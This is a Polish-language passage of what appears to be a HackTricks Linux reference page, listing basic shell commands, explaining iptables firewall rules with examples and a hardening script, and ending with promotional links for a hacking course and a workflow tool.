- `ping`: Wysyła pakiety ICMP do hosta.
- `ifconfig`: Wyświetla informacje o interfejsach sieciowych.
- `netstat`: Wyświetla informacje o połączeniach sieciowych.
- `wget`: Pobiera plik z sieci.
- `curl`: Wysyła żądanie HTTP do serwera.
- `ssh`: Nawiązuje połączenie SSH z innym hostem.
- `scp`: Kopiuje pliki między hostami za pomocą SSH.

### Polecenia administracyjne

- `sudo`: Wykonuje polecenie jako superużytkownik.
- `su`: Zmienia użytkownika.
- `passwd`: Zmienia hasło użytkownika.
- `useradd`: Dodaje nowego użytkownika.
- `userdel`: Usuwa użytkownika.
- `groupadd`: Dodaje nową grupę.
- `groupdel`: Usuwa grupę.
- `visudo`: Edytuje plik konfiguracyjny sudoers.

### Polecenia informacyjne

- `uname`: Wyświetla informacje o systemie.
- `whoami`: Wyświetla nazwę aktualnego użytkownika.
- `hostname`: Wyświetla nazwę hosta.
- `df`: Wyświetla informacje o dostępnym miejscu na dysku.
- `du`: Wyświetla informacje o zajętym miejscu na dysku.
- `free`: Wyświetla informacje o dostępnej pamięci.
- `uptime`: Wyświetla czas działania systemu.
- `date`: Wyświetla aktualną datę i godzinę.

### Polecenia archiwizacji

- `tar`: Tworzy lub rozpakowuje archiwum tar.
- `gzip`: Kompresuje plik.
- `gunzip`: Rozpakowuje skompresowany plik gzip.

### Polecenia programowania

- `echo`: Wyświetla tekst na ekranie.
- `read`: Wczytuje dane z wejścia.
- `for`: Wykonuje pętlę dla każdego elementu w liście.
- `while`: Wykonuje pętlę dopóki warunek jest spełniony.
- `if`: Wykonuje blok kodu, jeśli warunek jest spełniony.
- `case`: Wykonuje blok kodu, w zależności od wartości zmiennej.
- `function`: Definiuje funkcję.

### Polecenia innych narzędzi

- `grep`: Wyszukuje wzorce w plikach.
- `sed`: Edytuje tekst w plikach.
- `awk`: Przetwarza i analizuje tekst w plikach.
- `cut`: Wybiera określone pola z pliku.
- `sort`: Sortuje linie w pliku.
- `uniq`: Usuwa duplikaty z pliku.
- `wc`: Liczy słowa, linie i znaki w pliku.
- `head`: Wyświetla początkowe linie pliku.
- `tail`: Wyświetla końcowe linie pliku.

### Polecenia powłoki

- `echo`: Wyświetla tekst na ekranie.
- `read`: Wczytuje dane z wejścia.
- `export`: Ustawia zmienną środowiskową.
- `source`: Wykonuje skrypt powłoki.
- `alias`: Tworzy alias dla polecenia.
- `history`: Wyświetla historię poleceń.
- `exit`: Kończy sesję powłoki.

### Polecenia plików i katalogów

- `ls`: Wyświetla zawartość bieżącego katalogu.
- `cd`: Zmienia bieżący katalog.
- `pwd`: Wyświetla ścieżkę do bieżącego katalogu.
- `mkdir`: Tworzy nowy katalog.
- `rm`: Usuwa plik lub katalog.
- `cp`: Kopiuje plik lub katalog.
- `mv`: Przenosi plik lub katalog.
- `cat`: Wyświetla zawartość pliku.
- `touch`: Tworzy nowy plik.
- `chmod`: Zmienia uprawnienia pliku lub katalogu.
- `chown`: Zmienia właściciela pliku lub katalogu.
- `chgrp`: Zmienia grupę pliku lub katalogu.
- `find`: Wyszukuje pliki i katalogi.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables jest narzędziem do konfiguracji zapory sieciowej w systemach Linux. Pozwala na zarządzanie regułami filtracji pakietów, które przechodzą przez interfejsy sieciowe. Można go używać do blokowania lub przekierowywania ruchu sieciowego na podstawie różnych kryteriów, takich jak adres IP, porty, protokoły itp.

### Podstawowe polecenia

#### 1. iptables -L

Polecenie `iptables -L` wyświetla listę wszystkich reguł zapory sieciowej. Można użyć opcji `-v` lub `--verbose`, aby uzyskać bardziej szczegółowe informacje, takie jak liczba pakietów i bajtów, które pasują do każdej reguły.

#### 2. iptables -A

Polecenie `iptables -A` służy do dodawania nowych reguł do zapory sieciowej. Można określić różne parametry, takie jak źródłowy i docelowy adres IP, porty, protokoły itp. Przykład:

```
iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT
```

#### 3. iptables -D

Polecenie `iptables -D` służy do usuwania istniejących reguł z zapory sieciowej. Musisz podać numer reguły, którą chcesz usunąć. Przykład:

```
iptables -D INPUT 2
```

#### 4. iptables -P

Polecenie `iptables -P` służy do ustawiania domyślnych działań dla łańcuchów zapory sieciowej. Można ustawić domyślne działanie dla łańcuchów INPUT, OUTPUT i FORWARD. Przykład:

```
iptables -P INPUT DROP
```

### Przykłady użycia

#### 1. Blokowanie adresu IP

Aby zablokować ruch z określonego adresu IP, można użyć polecenia:

```
iptables -A INPUT -s 192.168.1.100 -j DROP
```

#### 2. Przekierowywanie portu

Aby przekierować ruch z jednego portu na inny, można użyć polecenia:

```
iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

#### 3. Ograniczanie liczby połączeń

Aby ograniczyć liczbę jednoczesnych połączeń z określonego adresu IP, można użyć polecenia:

```
iptables -A INPUT -p tcp --syn --dport 22 -m connlimit --connlimit-above 3 -j REJECT
```

### Ważne uwagi

- Polecenia `iptables` wymagają uprawnień administratora, dlatego należy je wykonywać jako użytkownik root lub użyć polecenia `sudo`.
- Reguły zapory sieciowej są stosowane w kolejności, w jakiej są dodawane. Ważne jest, aby pamiętać o kolejności reguł, ponieważ pierwsza pasująca reguła zostanie zastosowana.
- Aby zachować reguły zapory sieciowej po ponownym uruchomieniu systemu, należy je zapisać w odpowiednim pliku konfiguracyjnym, na przykład `/etc/iptables/rules.v4`.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** z wykorzystaniem najbardziej zaawansowanych narzędzi społeczności.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
